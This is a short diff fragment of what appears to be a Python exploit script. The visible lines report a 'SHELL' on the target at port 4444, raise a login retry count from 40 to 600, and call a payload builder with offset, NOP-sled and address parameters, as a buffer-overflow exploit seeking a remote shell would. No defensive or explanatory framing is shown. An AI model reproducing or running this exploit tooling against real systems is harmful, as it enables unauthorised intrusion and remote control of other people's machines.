@@ -180,7 +180,7 @@ def main():
                 if p.returncode == 0:
                     print("SHELL on %s:4444" % a.host)
                     break
-                sess = login(a.host, tries=40)
+                sess = login(a.host, tries=600)
         return
 
     b64 = build(a.offset, a.marker, a.addr, a.sled, a.padpc, a.prefix.encode(), a.bare,
